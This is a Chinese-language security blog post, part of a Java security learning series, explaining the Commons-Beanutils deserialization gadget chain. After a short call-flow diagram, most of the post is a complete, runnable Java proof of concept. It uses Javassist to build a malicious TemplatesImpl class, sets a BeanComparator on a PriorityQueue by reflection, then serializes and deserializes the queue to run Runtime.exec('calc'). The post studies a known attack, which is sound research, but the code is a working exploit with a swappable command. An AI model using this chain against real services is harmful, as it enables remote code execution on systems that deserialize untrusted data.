+++
title = "CB链"
date = 2026-06-15T20:00:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 正文

## 定义


CB 链  Commons Beanutils 链  依赖与apache 的另一个常用工具库  

commons-beanutils

commons-beanutils 是一个用于操作 Java Bean 属性的库（例如动态获取或设置对象的   getter/setter  

通常配合CC 链来进行 或使用JDK原生类


核心在于org.apache.commons.beanutils.BeanComparator


## 原理

 CB 链调用方式

  完整触发流程

  PriorityQueue.readObject()
      ↓
  PriorityQueue.heapify()
      ↓
  PriorityQueue.siftDown()
      ↓
  BeanComparator.compare()
      ↓
  PropertyUtils.getProperty()
      ↓
  TemplatesImpl.getOutputProperties()
      ↓
  TemplatesImpl.newTransformer()
      ↓
  TemplatesImpl.defineClass()
      ↓
  恶意类静态代码块执行
      ↓
  Runtime.exec("calc")






## 过程


弹出计算机

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613183835774.png)


源码

```java
package cb;

  

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javassist.*;

import javassist.bytecode.AccessFlag;

import org.apache.commons.beanutils.BeanComparator;

  

import java.io.*;

import java.lang.reflect.Field;

import java.util.Comparator;

import java.util.PriorityQueue;

  

/**

 * CB Chain - Calculator

 *

 * Flow:

 * PriorityQueue.readObject()

 *     -> PriorityQueue.heapify() -> siftDown()

 *     -> BeanComparator.compare()

 *     -> PropertyUtils.getProperty()

 *     -> TemplatesImpl.getOutputProperties()

 *     -> TemplatesImpl.newTransformer()

 *     -> TemplatesImpl.defineClass() -> load malicious bytecode

 *     -> Runtime.exec("calc")

 */

public class CBCalc {

  

    public static void main(String[] args) throws Exception {

        System.out.println("CB Chain - Calculator");

        System.out.println("====================\n");

  

        // Step 1: Generate malicious bytecode

        System.out.println("[*] Step 1: Generate malicious bytecode...");

        ClassPool pool = ClassPool.getDefault();

        pool.insertClassPath(new ClassClassPath(CBCalc.class));

  

        CtClass evilClass = pool.makeClass("Evil" + System.nanoTime());

        evilClass.setSuperclass(pool.get(

                "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"

        ));

        evilClass.makeClassInitializer().insertBefore(

                "Runtime.getRuntime().exec(\"calc\");"

        );

  

        // Add abstract methods

        CtClass domClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.DOM");

        CtClass dtmClass = pool.get("com.sun.org.apache.xml.internal.dtm.DTMAxisIterator");

        CtClass shClass = pool.makeInterface("com.sun.org.apache.xml.internal.serialize.SerializationHandler");

  

        CtMethod m1 = new CtMethod(CtClass.voidType, "transform",

                new CtClass[]{domClass, dtmClass, shClass}, evilClass);

        m1.setModifiers(AccessFlag.PUBLIC);

        m1.setBody("{}");

        evilClass.addMethod(m1);

  

        CtMethod m2 = new CtMethod(CtClass.voidType, "transform",

                new CtClass[]{domClass, pool.get("java.lang.Object[]")}, evilClass);

        m2.setModifiers(AccessFlag.PUBLIC);

        m2.setBody("{}");

        evilClass.addMethod(m2);

  

        byte[] evilBytes = evilClass.toBytecode();

        System.out.println("[+] Bytecode size: " + evilBytes.length + " bytes\n");

  

        // Step 2: Create TemplatesImpl

        System.out.println("[*] Step 2: Create TemplatesImpl...");

        TemplatesImpl templates = new TemplatesImpl();

  

        Field f;

        f = TemplatesImpl.class.getDeclaredField("_bytecodes");

        f.setAccessible(true);

        f.set(templates, new byte[][]{evilBytes});

  

        f = TemplatesImpl.class.getDeclaredField("_name");

        f.setAccessible(true);

        f.set(templates, "x");

  

        f = TemplatesImpl.class.getDeclaredField("_tfactory");

        f.setAccessible(true);

        f.set(templates, new TransformerFactoryImpl());

        System.out.println("[+] TemplatesImpl created\n");

  

        // Step 3: Create PriorityQueue with DUMMY comparator

        // We use a dummy comparator during add() to avoid triggering the chain prematurely

        System.out.println("[*] Step 3: Create PriorityQueue with dummy comparator...");

        Comparator dummyComparator = (o1, o2) -> 0;

        PriorityQueue queue = new PriorityQueue(2, dummyComparator);

        queue.add(templates);

        queue.add(templates);

        System.out.println("[+] PriorityQueue created with 2 elements\n");

  

        // Step 4: Replace comparator with BeanComparator using reflection

        // BeanComparator("outputProperties") will call getOutputProperties() during compare()

        System.out.println("[*] Step 4: Replace comparator with BeanComparator...");

        BeanComparator<Object> comparator = new BeanComparator<>("outputProperties");

  

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");

        comparatorField.setAccessible(true);

        comparatorField.set(queue, comparator);

        System.out.println("[+] BeanComparator set\n");

  

        // Step 5: Serialize

        System.out.println("[*] Step 5: Serialize...");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(baos);

        oos.writeObject(queue);

        oos.close();

        byte[] data = baos.toByteArray();

        System.out.println("[+] Serialized, size: " + data.length + " bytes\n");

  

        // Step 6: Deserialize and trigger

        System.out.println("[*] Step 6: Deserialize (will pop calculator)...");

        System.out.println("[*] Press Enter to trigger...");

        System.in.read();

  

        System.out.println("[*] Deserializing...");

        try {

            ByteArrayInputStream bais = new ByteArrayInputStream(data);

            ObjectInputStream ois = new ObjectInputStream(bais);

            ois.readObject();  // Trigger: readObject() -> heapify() -> siftDown() -> compare() -> getOutputProperties() -> newTransformer() -> defineClass() -> exec()

            ois.close();

        } catch (Exception e) {

            System.out.println("[-] Exception: " + e.getClass().getSimpleName());

            e.printStackTrace();

        }

  

        System.out.println("\n[+] Done! Calculator should pop up!");

    }

}
```


## 总结


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613184001608.png)
